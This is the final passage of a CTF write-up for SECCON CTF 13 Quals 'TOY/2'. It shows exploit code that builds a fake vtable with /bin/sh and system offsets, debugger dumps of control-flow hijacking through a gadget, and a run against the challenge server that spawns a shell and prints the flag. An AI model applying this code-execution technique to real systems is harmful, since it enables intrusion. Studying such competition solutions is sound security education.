+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf12 binsh (16-32)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf14 binsh (32-48)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf16 binsh (48-64)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">SYSTEMOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>          <span class="c1"># 0xf18 system offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">SYSTEMOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="c1"># 0xf1a system offset (16-32)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>                  <span class="c1"># 0xf1c _mem_ptr
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>            <span class="c1"># 0xf1e _mem_ptr+2
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>            <span class="c1"># 0xf20 _mem_ptr+4
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x480</span><span class="p">)</span>                          <span class="c1"># 0xf22 offset to fake vtable</span></code></pre></figure>
+
+<p>With this done, the challenge will end code execution and call <code class="language-plaintext highlighter-rouge">vm-&gt;dump_registers</code>, with <code class="language-plaintext highlighter-rouge">r14</code> pointing to <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x000055555556d7d0  →  0x0000000000000000
+$rbx   : 0x000055555556d3c0  →  0x000055555556d7d0  →  0x0000000000000000
+$rcx   : 0x00007ffff7c19574  →  0x5477fffff0003d48 ("H="?)
+$rdx   : 0x00007ffff7fb1310  →  0x00007ffff7e92670  →  0x6d058b48fa1e0ff3
+$rsp   : 0x00007fffffffecc0  →  0x000055555556c2b0  →  0x000055555556d0b0  →  0x0000000000000000
+$rbp   : 0x0000555555559080  →  0x00007ffff7fb1310  →  0x00007ffff7e92670  →  0x6d058b48fa1e0ff3
+$rsi   : 0x0               
+$rdi   : 0x000055555556d3c0  →  0x000055555556d7d0  →  0x0000000000000000
+$rip   : 0x000055555555689f  →  &lt;main+01cf&gt; call QWORD PTR [rax+0x8]
+$r8    : 0x9               
+$r9    : 0x0               
+$r10   : 0x1               
+$r11   : 0x202             
+$r12   : 0x000055555556d360  →  0x0068732f6e69622f ("/bin/sh"?)
+$r13   : 0x0               
+$r14   : 0x000055555556d360  →  0x0068732f6e69622f ("/bin/sh"?)
+$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →  0x00010102464c457f
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+─────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555556894 &lt;main+01c4&gt;      call   0x5555555561d0 &lt;_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@plt&gt;
+●  0x555555556899 &lt;main+01c9&gt;      mov    rax, QWORD PTR [rbx]
+   0x55555555689c &lt;main+01cc&gt;      mov    rdi, rbx
+ → 0x55555555689f &lt;main+01cf&gt;      call   QWORD PTR [rax+0x8]
+   0x5555555568a2 &lt;main+01d2&gt;      mov    rdi, rbx
+   0x5555555568a5 &lt;main+01d5&gt;      mov    esi, 0x1020
+   0x5555555568aa &lt;main+01da&gt;      call   0x555555556240 &lt;_ZdlPvm@plt&gt;
+   0x5555555568af &lt;main+01df&gt;      pop    rbx
+   0x5555555568b0 &lt;main+01e0&gt;      xor    eax, eax
+
+gef➤  x/30gx $rax+0x8
+0x55555556d7d8:	0x00007ffff7c6b44e	0x00007ffff7b5575b &lt;= gadget / system+0x1b
+0x55555556d7e8:	0x0000000000000000	0x0000000000000000
+0x55555556d7f8:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Calling our gadget, which will set <code class="language-plaintext highlighter-rouge">rdi</code> to <code class="language-plaintext highlighter-rouge">r14</code> and then calling <code class="language-plaintext highlighter-rouge">[rax + 0x10]</code>, which points to <code class="language-plaintext highlighter-rouge">system+0x1b</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x000055555556d7d0  →  0x0000000000000000
+$rbx   : 0x000055555556d3c0  →  0x000055555556d7d0  →  0x0000000000000000
+$rcx   : 0x00007ffff7c19574  →  0x5477fffff0003d48 ("H="?)
+$rdx   : 0x00007ffff7fb1310  →  0x00007ffff7e92670  →  0x6d058b48fa1e0ff3
+$rsp   : 0x00007fffffffecb8  →  0x00005555555568a2  →  &lt;main+01d2&gt; mov rdi, rbx
+$rbp   : 0x0000555555559080  →  0x00007ffff7fb1310  →  0x00007ffff7e92670  →  0x6d058b48fa1e0ff3
+$rsi   : 0x0               
+$rdi   : 0x000055555556d3c0  →  0x000055555556d7d0  →  0x0000000000000000
+$rip   : 0x00007ffff7c6b44e  →  0xc0851050fff7894c
+$r8    : 0x9               
+$r9    : 0x0               
+$r10   : 0x1               
+$r11   : 0x202             
+$r12   : 0x000055555556d360  →  0x0068732f6e69622f ("/bin/sh"?)
+$r13   : 0x0               
+$r14   : 0x000055555556d360  →  0x0068732f6e69622f ("/bin/sh"?)
+$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →  0x00010102464c457f
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7c6b443                  mov    rax, QWORD PTR [r14+0x8]
+   0x7ffff7c6b447                  mov    rsi, QWORD PTR [rbx+0x10]
+   0x7ffff7c6b44b                  mov    rdx, r12
+ → 0x7ffff7c6b44e                  mov    rdi, r14
+   0x7ffff7c6b451                  call   QWORD PTR [rax+0x10]
+   0x7ffff7c6b454                  test   eax, eax
+   0x7ffff7c6b456                  je     0x7ffff7c6b56d
+   0x7ffff7c6b45c                  mov    rdi, r12
+   0x7ffff7c6b45f                  call   QWORD PTR [rbx]</code></pre></figure>
+
+<p>which will then finally trigger our shell :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">python3 workxpl.py 1
+[*] '/home/kileak/ctf/seccon24/toy2/TOY_2/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to toy-2.seccon.games on port 5000: Done
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+
+[+] Running...
+[+] Done.
+$ cat /flag*
+SECCON{Im4g1n3_pWn1n6_1n51d3_a_3um_CM0S}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=SECCON CTF 13 Quals - TOY/2&amp;url=https://kileak.github.io/ctf/2024/seccon13quals-toy2/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2024/seccon13quals-toy2/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2024/seccon13quals-toy2';
+        var disqus_title = 'SECCON CTF 13 Quals - TOY/2';
+        var disqus_url = 'https://kileak.github.io/ctf/2024/seccon13quals-toy2';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
